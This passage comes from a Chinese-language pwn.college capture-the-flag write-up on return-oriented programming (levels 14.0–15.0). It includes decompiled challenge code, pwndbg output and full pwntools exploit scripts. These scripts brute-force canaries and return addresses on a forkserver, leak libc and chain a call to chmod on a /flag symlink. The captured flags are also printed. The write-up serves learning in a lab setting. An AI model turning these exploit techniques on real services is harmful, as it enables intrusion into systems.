        pop_rsi_ret = rop.rsi.address

        filename = next(local_libc.search(b"GNU"))
        mode = 0o4

        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            pop_rdi_ret,
            filename,
            pop_rsi_ret,
            mode,
            local_libc.symbols["chmod"],
        )
    else:
        log.error(b"Invalid stage number!")


def attack(target):
    try:
        os.system("ln -s /flag GNU")

        leaked_canary = leak(target, CANARY_OFFSET, "canary")
        payload = construct_payload(1, leaked_canary)

        target.send(payload)

        try:
            response = target.recvuntil(b"Welcome to (null)!", timeout=0.1)

            if b"Welcome to (null)!" in response:
                payload = construct_payload(
                    2, leaked_canary, leak(target, RET_OFFSET, "libc_base")
                )

                target.send(payload)
        except Exception as e:
            log.failure(f"String not detected in this turn. {e}")

        target.recvall(timeout=3)

        try:
            with open("/flag", "r") as f:
                log.success(f.read())
            return True
        except FileNotFoundError:
            log.exception("The file '/flag' does not exist.")
        except PermissionError:
            log.failure("Permission denied to read '/flag'.")
        except Exception as e:
            log.exception(f"An error occurred while performing attack: {e}")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    while True:
        target = None

        try:
            target = launch(debug=False)

            if attack(target):
                exit()
        except Exception as e:
            log.exception(f"An error occurred in main: {e}")
        finally:
            if target is not None:
                target.close()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{M-9WLFPzOoEolY4qgzOfZ2Xk3JW.0lN2MDL5cTNxgzW}`

# Level 14.0

## Information

- Category: Pwn

## Description

> Perform ROP against a network forkserver!

## Write-up

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int optval; // [rsp+24h] [rbp-2Ch] BYREF
  int fd; // [rsp+28h] [rbp-28h]
  int v7; // [rsp+2Ch] [rbp-24h]
  sockaddr addr; // [rsp+30h] [rbp-20h] BYREF
  unsigned __int64 v9; // [rsp+48h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts("This challenge is listening for connections on TCP port 1337.\n");
  puts("The challenge supports unlimited sequential connections.\n");
  fd = socket(2, 1, 0);
  optval = 1;
  setsockopt(fd, 1, 15, &optval, 4u);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x539u);
  bind(fd, &addr, 0x10u);
  listen(fd, 1);
  while ( 1 )
  {
    v7 = accept(fd, 0LL, 0LL);
    if ( !fork() )
      break;
    close(v7);
    wait(0LL);
  }
  dup2(v7, 0);
  dup2(v7, 1);
  dup2(v7, 2);
  close(fd);
  close(v7);
  challenge((unsigned int)argc, argv, envp);
  puts("### Goodbye!");
  return 0;
}
```

```c del={31} collapse={1-27, 35-37}
int __fastcall challenge(int a1, __int64 a2, __int64 a3)
{
  _QWORD v4[3]; // [rsp+0h] [rbp-80h] BYREF
  int v5; // [rsp+1Ch] [rbp-64h]
  int v6; // [rsp+2Ch] [rbp-54h]
  _BYTE buf[72]; // [rsp+30h] [rbp-50h] BYREF
  unsigned __int64 v8; // [rsp+78h] [rbp-8h]
  __int64 savedregs; // [rsp+80h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+88h] [rbp+8h] BYREF

  v5 = a1;
  v4[2] = a2;
  v4[1] = a3;
  v8 = __readfsqword(0x28u);
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts(
    "PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a");
  puts(
    "partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes");
  puts(
    "to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to");
  puts(
    "ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This");
  puts("might take anywhere from 0-12 bits of bruteforce depending on the scenario.\n");
  v6 = read(0, buf, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v6, (unsigned __int64)&buf[v6 - rp_] >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v6 - rp_] >> 3) + 1);
  return puts("Leaving!");
}
```

`forkserver`，典。

爆破 Canary、ret2main, leak libc 再 ROP 应该就好了。2.9 有个 Nu1L Junior 招新赛，我得去抽个热闹，万一选上了岂不是很爽，但是现在才学到 ROP，好在还有一点时间，得提前学点堆了，就怕到时候遇到堆题啥也不会就死了……

反正这章只剩下两道题，我就先鸽着了，看了下简介感觉都不难，感觉无非就是把所有知识综合起来罢了。

吗的 Heap 镇南，我被蹂躏的好惨，还是先把这两题打了稳固下 rank 吧。

重新总结下思路：因为是 forkserver，子进程会沿用父进程的内存布局，所以我们可以把 canary 和 retaddr 爆破出来。有了 retaddr 后我们就可以使用一些程序本身的 gadgets 了，但是这些 gadgets 中不包含 syscall 什么的，所以不能做一些很 powerful 的事情，但是 libc 里面一定有好东西，那么问题就在于怎么获得 libc 基地址了。因为这个程序使用了 `puts` 函数，所以我们可以构造两个 stage payload，第一个 stage 用 `puts@plt` 泄漏 `__libc_start_main` 的地址，第二个 stage 根据泄漏出来的地址计算 libc 基地址，然后构造 ROP Chain Do anything whatever you want!

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    p8,
    process,
    remote,
    sleep,
    time,
)
from pwnlib.gdb import psutil

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level14.0"
HOST, PORT = "localhost", 1337

gdbscript = """
set follow-fork-mode child
b *challenge+383
c
"""

CANARY_OFFSET = 0x48
ELF_OFFSET = 0x23C8
LIBC_OFFSET = 0x23F90


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def get_forked_pid(parent_pid):
    children = psutil.Process(parent_pid).children()

    if len(children) != 1:
        raise ValueError(f"Expected 1 child process, found {len(children)}")

    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")

    return children[0].pid


def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)

        if debug:
            if attach:
                nc_process = process(["nc", HOST, str(PORT)])
                sleep(1)

                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)

                return nc_process
            else:
                target.close()

                return gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def brute_force(target_type, fixed_byte, canary=b""):
    current = fixed_byte
    length = 0x8 if target_type == "canary" else 0x6
    start_time = time.time()

    while len(current) < length:
        for byte in range(0x0, 0xFF):
            with remote(HOST, PORT) as target:
                payload = flat(
                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
                    if target_type == "canary"
                    else b"".ljust(CANARY_OFFSET, b"A")
                    + canary
                    + b"".ljust(0x8, b"A")
                    + current
                    + p8(byte)
                )

                target.send(payload)

                response = target.recvall(timeout=3)

                if (
                    target_type == "canary"
                    and b"*** stack smashing detected ***" not in response
                ) or (target_type == "retaddr" and b"Goodbye!" in response):
                    current += p8(byte)
                    break

    end_time = time.time()
    elapsed_time = end_time - start_time

    log.success(
        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
    )

    return current


def construct_payload(stage, canary, retaddr, leaked_libc=None):
    elf.address = int.from_bytes(retaddr, "little") - ELF_OFFSET

    rop = ROP(elf)

    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.rsi.address

    if stage == 1:
        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            pop_rdi_ret,
            elf.got["__libc_start_main"],
            elf.plt["puts"],
        )
    elif stage == 2:
        if leaked_libc is None:
            log.failure("libc_base is required for stage 2!")
            exit()

        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET

        filename = next(elf.search(b"GNU"))
        mode = 0o4

        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            pop_rdi_ret,
            filename,
            pop_rsi_pop_r15_ret,
            mode,
            b"".ljust(0x8, b"A"),
            libc.symbols["chmod"],
        )


def attack(stage, canary=None, retaddr=None, leaked_libc=None):
    try:
        if stage == 1:
            with remote(HOST, PORT) as target:
                payload = construct_payload(1, canary, retaddr)
                target.send(payload)

                response = target.recvall(timeout=1)

                return response[-7:].rstrip()
        elif stage == 2:
            os.system("ln -s /flag GNU")

            with remote(HOST, PORT) as target:
                payload = construct_payload(2, canary, retaddr, leaked_libc)

                target.send(payload)
                target.recvall(timeout=1)

            try:
                with open("/flag", "r") as f:
                    log.success(f.read())
                return True
            except FileNotFoundError:
                log.exception("The file '/flag' does not exist.")
            except PermissionError:
                log.failure("Permission denied to read '/flag'.")
        else:
            log.error(b"Invalid stage number!")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        launch(debug=False, attach=False)

        canary = brute_force("canary", b"\x00")
        retaddr = brute_force("retaddr", b"\xc8", canary)
        leaked_libc = attack(1, canary, retaddr)

        if attack(2, canary, retaddr, leaked_libc):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{wJF3GTTKHHSqaWXrhLMIUW4ocoT.01N2MDL5cTNxgzW}`

# Level 14.1

## Information

- Category: Pwn

## Description

> Perform ROP against a network forkserver!

## Write-up

参见 [Level 14.0](#level-140)。

## Exploit

```python
#!/usr/bin/python3

from pwn import (
    ELF,
    ROP,
    context,
    flat,
    gdb,
    log,
    os,
    p8,
    process,
    remote,
    sleep,
    time,
)
from pwnlib.gdb import psutil

context(log_level="debug", terminal="kitty")

FILE = "./babyrop_level14.1"
HOST, PORT = "localhost", 1337

gdbscript = """
set follow-fork-mode child
c
"""

CANARY_OFFSET = 0x48
ELF_OFFSET = 0x1726
LIBC_OFFSET = 0x23F90


def to_hex_bytes(data):
    return "".join(f"\\x{byte:02x}" for byte in data)


def get_forked_pid(parent_pid):
    children = psutil.Process(parent_pid).children()

    if len(children) != 1:
        raise ValueError(f"Expected 1 child process, found {len(children)}")

    log.success(f"Parent PID {parent_pid} -> Found child PID {children[0].pid}")

    return children[0].pid


def launch(local=True, debug=False, aslr=False, argv=None, envp=None, attach=False):
    if local:
        global elf

        elf = ELF(FILE)
        context.binary = elf

        target = process([elf.path] + (argv or []), env=envp, aslr=aslr)

        if debug:
            if attach:
                nc_process = process(["nc", HOST, str(PORT)])
                sleep(1)

                gdb.attach(target=get_forked_pid(target.pid), gdbscript=gdbscript)

                return nc_process
            else:
                target.close()

                return gdb.debug(
                    [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
                )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def brute_force(target_type, fixed_byte, canary=b""):
    current = fixed_byte
    length = 0x8 if target_type == "canary" else 0x6
    start_time = time.time()

    while len(current) < length:
        for byte in range(0x0, 0xFF):
            with remote(HOST, PORT) as target:
                payload = flat(
                    b"".ljust(CANARY_OFFSET, b"A") + current + p8(byte)
                    if target_type == "canary"
                    else b"".ljust(CANARY_OFFSET, b"A")
                    + canary
                    + b"".ljust(0x8, b"A")
                    + current
                    + p8(byte)
                )

                target.send(payload)

                response = target.recvall(timeout=3)

                if (
                    target_type == "canary"
                    and b"*** stack smashing detected ***" not in response
                ) or (target_type == "retaddr" and b"Goodbye!" in response):
                    current += p8(byte)
                    break

    end_time = time.time()
    elapsed_time = end_time - start_time

    log.success(
        f"{target_type.capitalize()} brute-forced: {to_hex_bytes(current)} in {elapsed_time:.2f} seconds."
    )

    return current


def construct_payload(stage, canary, retaddr, leaked_libc=None):
    elf.address = int.from_bytes(retaddr, "little") - ELF_OFFSET

    rop = ROP(elf)

    pop_rdi_ret = rop.rdi.address
    pop_rsi_pop_r15_ret = rop.rsi.address

    if stage == 1:
        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            pop_rdi_ret,
            elf.got["__libc_start_main"],
            elf.plt["puts"],
        )
    elif stage == 2:
        if leaked_libc is None:
            log.failure("libc_base is required for stage 2!")
            exit()

        libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
        libc.address = int.from_bytes(leaked_libc, "little") - LIBC_OFFSET

        filename = next(elf.search(b"GNU"))
        mode = 0o4

        return flat(
            b"".ljust(CANARY_OFFSET, b"A"),
            canary,
            b"".ljust(0x8, b"A"),
            pop_rdi_ret,
            filename,
            pop_rsi_pop_r15_ret,
            mode,
            b"".ljust(0x8, b"A"),
            libc.symbols["chmod"],
        )


def attack(stage, canary=None, retaddr=None, leaked_libc=None):
    try:
        if stage == 1:
            with remote(HOST, PORT) as target:
                payload = construct_payload(1, canary, retaddr)
                target.send(payload)

                response = target.recvall(timeout=1)

                return response[-7:].rstrip()
        elif stage == 2:
            os.system("ln -s /flag GNU")

            with remote(HOST, PORT) as target:
                payload = construct_payload(2, canary, retaddr, leaked_libc)

                target.send(payload)
                target.recvall(timeout=1)

            try:
                with open("/flag", "r") as f:
                    log.success(f.read())
                return True
            except FileNotFoundError:
                log.exception("The file '/flag' does not exist.")
            except PermissionError:
                log.failure("Permission denied to read '/flag'.")
        else:
            log.error(b"Invalid stage number!")
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        launch(debug=False, attach=False)

        canary = brute_force("canary", b"\x00")
        retaddr = brute_force("retaddr", b"\x26", canary)
        leaked_libc = attack(1, canary, retaddr)

        if attack(2, canary, retaddr, leaked_libc):
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{IcjKEpDUZ1r43p0FESk4RB96-1s.0FO2MDL5cTNxgzW}`

# Level 15.0

## Information

- Category: Pwn

## Description

> Perform ROP when the stack frame returns to libc!

## Write-up

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // [rsp+0h] [rbp-C0h] BYREF
  const char **v5; // [rsp+8h] [rbp-B8h]
  const char **v6; // [rsp+10h] [rbp-B0h]
  int v7; // [rsp+1Ch] [rbp-A4h]
  int optval; // [rsp+2Ch] [rbp-94h] BYREF
  int fd; // [rsp+30h] [rbp-90h]
  int v10; // [rsp+34h] [rbp-8Ch]
  int v11; // [rsp+38h] [rbp-88h]
  int v12; // [rsp+3Ch] [rbp-84h]
  const char **v13; // [rsp+40h] [rbp-80h]
  const char **v14; // [rsp+48h] [rbp-78h]
  sockaddr addr; // [rsp+50h] [rbp-70h] BYREF
  _BYTE buf[88]; // [rsp+60h] [rbp-60h] BYREF
  unsigned __int64 v17; // [rsp+B8h] [rbp-8h]
  __int64 savedregs; // [rsp+C0h] [rbp+0h] BYREF
  _UNKNOWN *retaddr; // [rsp+C8h] [rbp+8h] BYREF

  v7 = argc;
  v6 = argv;
  v5 = envp;
  v17 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts("This challenge is listening for connections on TCP port 1337.\n");
  puts("The challenge supports unlimited sequential connections.\n");
  fd = socket(2, 1, 0);
  optval = 1;
  setsockopt(fd, 1, 15, &optval, 4u);
  addr.sa_family = 2;
  *(_DWORD *)&addr.sa_data[2] = 0;
  *(_WORD *)addr.sa_data = htons(0x539u);
  bind(fd, &addr, 0x10u);
  listen(fd, 1);
  while ( 1 )
  {
    v10 = accept(fd, 0LL, 0LL);
    if ( !fork() )
      break;
    close(v10);
    wait(0LL);
  }
  dup2(v10, 0);
  dup2(v10, 1);
  dup2(v10, 2);
  close(fd);
  close(v10);
  v11 = v7;
  v13 = v6;
  v14 = v5;
  puts(
    "This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of");
  puts("challenges, you will become painfully familiar with the concept of Return Oriented Programming!\n");
  sp_ = (__int64)&v4;
  bp_ = (__int64)&savedregs;
  sz_ = ((unsigned __int64)((char *)&savedregs - (char *)&v4) >> 3) + 2;
  rp_ = (__int64)&retaddr;
  puts(
    "PIE is turned on! This means that you do not know where any of the gadgets in the main binary are. However, you can do a");
  puts(
    "partial overwrite of the saved instruction pointer in order to execute 1 gadget! If that saved instruction pointer goes");
  puts(
    "to libc, you will need to ROP from there. If that saved instruction pointer goes to the main binary, you will need to");
  puts(
    "ROP from there. You may need need to execute your payload several times to account for the randomness introduced. This");
  puts("might take anywhere from 0-12 bits of bruteforce depending on the scenario.\n");
  v12 = read(0, buf, 0x1000uLL);
  printf("Received %d bytes! This is potentially %d gadgets.\n", v12, (unsigned __int64)&buf[v12 - rp_] >> 3);
  puts("Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable");
  puts("from within this challenge. You will have to do that by yourself.");
  print_chain(rp_, (unsigned int)((unsigned __int64)&buf[v12 - rp_] >> 3) + 1);
  puts("Leaving!");
  puts("### Goodbye!");
  return 0;
}
```

与上一题的区别在于上一题会返回到 binary 的 `main` 中，而这题直接把所有逻辑都写在 `main` 里面了，那就会返回到 `libc`。

因为上题会返回到 `main`，里面有一些输出信息，所以我们很容易判断返回地址的下一字节是否爆破成功，但这题返回到 `libc`，默认是要执行 `exit()` 的，不会产生任何输出信息，直接爆破肯定是得不到完整返回地址的。难点就在这里，怎么确定我的爆破是否成功了，以便继续爆破下一字节？

经实测发现，`pwntools` 在检测到 `fork` 出新的子进程后 debug log 会输出这样一段信息：

```plaintext showLineNumbers=false wrap=false
b'     42242:\t\n'
b'     42242:\ttransferring control: /challenge/babyrop_level15.0\n'
b'     42242:\t\n'
```

LMAO，看到这段美丽的 debug log 我就知道这题已经到手了！

所以我们只要根据上面这个 transferring control 信息就能判断程序是否成功返回到 `fork()` 了。然后实际编写 exp 的时候我还发现，在成功返回到 `fork()` 生成了新的 `main` 进程后后续的连接都会变得十分缓慢/碰运气，这是因为有两个进程同时监听来自指定端口的连接，产生了条件竞争，我们杀掉一个就好了。幸运的，pwntools 的 debug log 除了提示我们 fork 出了一个新的进程外，还把 fork 出来的子进程的 PID 也告诉我们了，所以我们直接把这个子进程 kill 掉就好了。这无疑为我们编写自动化脚本提供了极大的便利，否则就要手动 kill 了，我看 discord 社区还真有人这么干，显然是没发现 pwntools 的强大……

有关爆破返回地址这里其实还有一个坑，如果你看 `got` 表：

```asm showLineNumbers=false wrap=false {25}
pwndbg> got -r
State of the GOT of /home/cub3y0nd/Projects/pwn.college/babyrop_level15.0:
GOT protection: Full RELRO | Found 28 GOT entries passing the filter
[0x60fada8bdf20] putchar@GLIBC_2.2.5 -> 0x763654694280 (putchar) ◂— endbr64
[0x60fada8bdf28] __errno_location@GLIBC_2.2.5 -> 0x763654632400 (__errno_location) ◂— endbr64
[0x60fada8bdf30] puts@GLIBC_2.2.5 -> 0x763654692420 (puts) ◂— endbr64
[0x60fada8bdf38] setsockopt@GLIBC_2.2.5 -> 0x76365472e960 (setsockopt) ◂— endbr64
[0x60fada8bdf40] cs_free -> 0x763654a5aba0 (cs_free) ◂— endbr64
[0x60fada8bdf48] __stack_chk_fail@GLIBC_2.4 -> 0x76365473dc90 (__stack_chk_fail) ◂— endbr64
[0x60fada8bdf50] htons@GLIBC_2.2.5 -> 0x76365473dcf0 (ntohs) ◂— endbr64
[0x60fada8bdf58] dup2@GLIBC_2.2.5 -> 0x76365471cae0 (dup2) ◂— endbr64
[0x60fada8bdf60] printf@GLIBC_2.2.5 -> 0x76365466fc90 (printf) ◂— endbr64
[0x60fada8bdf68] close@GLIBC_2.2.5 -> 0x76365471ca20 (close) ◂— endbr64
[0x60fada8bdf70] read@GLIBC_2.2.5 -> 0x76365471c1e0 (read) ◂— endbr64
[0x60fada8bdf78] strcmp@GLIBC_2.2.5 -> 0x763654791df0 ◂— endbr64
[0x60fada8bdf80] cs_disasm -> 0x763654a5b000 (cs_disasm) ◂— endbr64
[0x60fada8bdf88] mincore@GLIBC_2.2.5 -> 0x763654726cc0 (mincore) ◂— endbr64
[0x60fada8bdf90] listen@GLIBC_2.2.5 -> 0x76365472e4e0 (listen) ◂— endbr64
[0x60fada8bdf98] setvbuf@GLIBC_2.2.5 -> 0x763654692ce0 (setvbuf) ◂— endbr64
[0x60fada8bdfa0] bind@GLIBC_2.2.5 -> 0x76365472e380 (bind) ◂— endbr64
[0x60fada8bdfa8] cs_open -> 0x763654a5a6a0 (cs_open) ◂— endbr64
[0x60fada8bdfb0] accept@GLIBC_2.2.5 -> 0x76365472e2e0 (accept) ◂— endbr64
[0x60fada8bdfb8] cs_close -> 0x763654a5a830 (cs_close) ◂— endbr64
[0x60fada8bdfc0] wait@GLIBC_2.2.5 -> 0x7636546f0bd0 (wait) ◂— endbr64
[0x60fada8bdfc8] fork@GLIBC_2.2.5 -> 0x7636546f0ef0 (fork) ◂— endbr64
[0x60fada8bdfd0] socket@GLIBC_2.2.5 -> 0x76365472e9c0 (socket) ◂— endbr64
[0x60fada8bdfd8] _ITM_deregisterTMCloneTable -> 0
[0x60fada8bdfe0] __libc_start_main@GLIBC_2.2.5 -> 0x763654631f90 (__libc_start_main) ◂— endbr64
[0x60fada8bdfe8] __gmon_start__ -> 0
[0x60fada8bdff0] _ITM_registerTMCloneTable -> 0
[0x60fada8bdff8] __cxa_finalize@GLIBC_2.2.5 -> 0x763654654f10 (__cxa_finalize) ◂— endbr64
```

再看 `__libc_start_main` 的汇编：

```asm showLineNumbers=false wrap=false {33} ins={34-40} collapse={6-29, 44-118}
pwndbg> disass __libc_start_main
Dump of assembler code for function __libc_start_main:
   0x0000763654631f90 <+0>: endbr64
   0x0000763654631f94 <+4>: push   r15
   0x0000763654631f96 <+6>: xor    eax,eax
   0x0000763654631f98 <+8>: push   r14
   0x0000763654631f9a <+10>: push   r13
   0x0000763654631f9c <+12>: push   r12
   0x0000763654631f9e <+14>: push   rbp
   0x0000763654631f9f <+15>: push   rbx
   0x0000763654631fa0 <+16>: mov    rbx,rcx
   0x0000763654631fa3 <+19>: sub    rsp,0x98
   0x0000763654631faa <+26>: mov    QWORD PTR [rsp+0x8],rdx
   0x0000763654631faf <+31>: mov    rdx,QWORD PTR [rip+0x1c7f8a]        # 0x7636547f9f40
   0x0000763654631fb6 <+38>: mov    QWORD PTR [rsp+0x18],rdi
   0x0000763654631fbb <+43>: mov    rdi,r9
   0x0000763654631fbe <+46>: mov    DWORD PTR [rsp+0x14],esi
   0x0000763654631fc2 <+50>: test   rdx,rdx
   0x0000763654631fc5 <+53>: je     0x763654631fd0 <__libc_start_main+64>
   0x0000763654631fc7 <+55>: mov    edx,DWORD PTR [rdx]
   0x0000763654631fc9 <+57>: xor    eax,eax
   0x0000763654631fcb <+59>: test   edx,edx
   0x0000763654631fcd <+61>: sete   al
   0x0000763654631fd0 <+64>: mov    DWORD PTR [rip+0x1c81ca],eax        # 0x7636547fa1a0
   0x0000763654631fd6 <+70>: test   rdi,rdi
   0x0000763654631fd9 <+73>: je     0x763654631fe4 <__libc_start_main+84>
   0x0000763654631fdb <+75>: xor    edx,edx
   0x0000763654631fdd <+77>: xor    esi,esi
   0x0000763654631fdf <+79>: call   0x763654654de0 <__cxa_atexit>
   0x0000763654631fe4 <+84>: mov    rdx,QWORD PTR [rip+0x1c7e75]        # 0x7636547f9e60
   0x0000763654631feb <+91>: mov    ebp,DWORD PTR [rdx]
   0x0000763654631fed <+93>: and    ebp,0x2
   0x0000763654631ff0 <+96>: jne    0x76365463208a <__libc_start_main+250>
   0x0000763654631ff6 <+102>: test   rbx,rbx
   0x0000763654631ff9 <+105>: je     0x763654632010 <__libc_start_main+128>
   0x0000763654631ffb <+107>: mov    rax,QWORD PTR [rip+0x1c7eae]        # 0x7636547f9eb0
   0x0000763654632002 <+114>: mov    rsi,QWORD PTR [rsp+0x8]
   0x0000763654632007 <+119>: mov    edi,DWORD PTR [rsp+0x14]
   0x000076365463200b <+123>: mov    rdx,QWORD PTR [rax]
   0x000076365463200e <+126>: call   rbx
   0x0000763654632010 <+128>: mov    rdx,QWORD PTR [rip+0x1c7e49]        # 0x7636547f9e60
   0x0000763654632017 <+135>: mov    eax,DWORD PTR [rdx+0x210]
   0x000076365463201d <+141>: test   eax,eax
   0x000076365463201f <+143>: jne    0x7636546320ec <__libc_start_main+348>
   0x0000763654632025 <+149>: test   ebp,ebp
   0x0000763654632027 <+151>: jne    0x763654632150 <__libc_start_main+448>
   0x000076365463202d <+157>: lea    rdi,[rsp+0x20]
   0x0000763654632032 <+162>: call   0x763654650c80 <_setjmp>
   0x0000763654632037 <+167>: endbr64
   0x000076365463203b <+171>: test   eax,eax
   0x000076365463203d <+173>: jne    0x7636546320a6 <__libc_start_main+278>
   0x000076365463203f <+175>: mov    rax,QWORD PTR fs:0x300
   0x0000763654632048 <+184>: mov    QWORD PTR [rsp+0x68],rax
   0x000076365463204d <+189>: mov    rax,QWORD PTR fs:0x2f8
   0x0000763654632056 <+198>: mov    QWORD PTR [rsp+0x70],rax
   0x000076365463205b <+203>: lea    rax,[rsp+0x20]
   0x0000763654632060 <+208>: mov    QWORD PTR fs:0x300,rax
   0x0000763654632069 <+217>: mov    rax,QWORD PTR [rip+0x1c7e40]        # 0x7636547f9eb0
   0x0000763654632070 <+224>: mov    rsi,QWORD PTR [rsp+0x8]
   0x0000763654632075 <+229>: mov    edi,DWORD PTR [rsp+0x14]
   0x0000763654632079 <+233>: mov    rdx,QWORD PTR [rax]
   0x000076365463207c <+236>: mov    rax,QWORD PTR [rsp+0x18]
   0x0000763654632081 <+241>: call   rax
   0x0000763654632083 <+243>: mov    edi,eax
   0x0000763654632085 <+245>: call   0x763654654a40 <exit>
   0x000076365463208a <+250>: mov    rax,QWORD PTR [rsp+0x8]
   0x000076365463208f <+255>: lea    rdi,[rip+0x18fdd2]        # 0x7636547c1e68
   0x0000763654632096 <+262>: mov    rsi,QWORD PTR [rax]
   0x0000763654632099 <+265>: xor    eax,eax
   0x000076365463209b <+267>: call   QWORD PTR [rdx+0x1d0]
   0x00007636546320a1 <+273>: jmp    0x763654631ff6 <__libc_start_main+102>
   0x00007636546320a6 <+278>: mov    rax,QWORD PTR [rip+0x1cd3cb]        # 0x7636547ff478
   0x00007636546320ad <+285>: ror    rax,0x11
   0x00007636546320b1 <+289>: xor    rax,QWORD PTR fs:0x30
   0x00007636546320ba <+298>: call   rax
   0x00007636546320bc <+300>: mov    rax,QWORD PTR [rip+0x1cd3a5]        # 0x7636547ff468
   0x00007636546320c3 <+307>: ror    rax,0x11
   0x00007636546320c7 <+311>: xor    rax,QWORD PTR fs:0x30
   0x00007636546320d0 <+320>: lock dec DWORD PTR [rax]
   0x00007636546320d3 <+323>: sete   dl
   0x00007636546320d6 <+326>: test   dl,dl
   0x00007636546320d8 <+328>: jne    0x7636546320e8 <__libc_start_main+344>
   0x00007636546320da <+330>: mov    edx,0x3c
   0x00007636546320df <+335>: nop
   0x00007636546320e0 <+336>: xor    edi,edi
   0x00007636546320e2 <+338>: mov    eax,edx
   0x00007636546320e4 <+340>: syscall
   0x00007636546320e6 <+342>: jmp    0x7636546320e0 <__libc_start_main+336>
   0x00007636546320e8 <+344>: xor    eax,eax
   0x00007636546320ea <+346>: jmp    0x763654632083 <__libc_start_main+243>
   0x00007636546320ec <+348>: mov    r13,QWORD PTR [rip+0x1c7cfd]        # 0x7636547f9df0
   0x00007636546320f3 <+355>: mov    r12d,eax
   0x00007636546320f6 <+358>: mov    r14,QWORD PTR [rdx+0x208]
   0x00007636546320fd <+365>: shl    r12,0x4
   0x0000763654632101 <+369>: mov    r15,QWORD PTR [r13+0x0]
   0x0000763654632105 <+373>: mov    rbx,r15
   0x0000763654632108 <+376>: add    r12,r15
   0x000076365463210b <+379>: cmp    rbx,r12
   0x000076365463210e <+382>: je     0x763654632025 <__libc_start_main+149>
   0x0000763654632114 <+388>: mov    rax,QWORD PTR [r14+0x18]
   0x0000763654632118 <+392>: test   rax,rax
   0x000076365463211b <+395>: je     0x763654632139 <__libc_start_main+425>
   0x000076365463211d <+397>: mov    rdx,QWORD PTR [rip+0x1c7ccc]        # 0x7636547f9df0
   0x0000763654632124 <+404>: lea    rdi,[rbx+0x480]
   0x000076365463212b <+411>: add    rdx,0x988
   0x0000763654632132 <+418>: cmp    r15,rdx
   0x0000763654632135 <+421>: je     0x763654632147 <__libc_start_main+439>
   0x0000763654632137 <+423>: call   rax
   0x0000763654632139 <+425>: mov    r14,QWORD PTR [r14+0x40]
   0x000076365463213d <+429>: add    r13,0x10
   0x0000763654632141 <+433>: add    rbx,0x10
   0x0000763654632145 <+437>: jmp    0x76365463210b <__libc_start_main+379>
   0x0000763654632147 <+439>: lea    rdi,[r13+0xe08]
   0x000076365463214e <+446>: jmp    0x763654632137 <__libc_start_main+423>
   0x0000763654632150 <+448>: mov    rax,QWORD PTR [rsp+0x8]
   0x0000763654632155 <+453>: mov    rdx,QWORD PTR [rip+0x1c7d04]        # 0x7636547f9e60
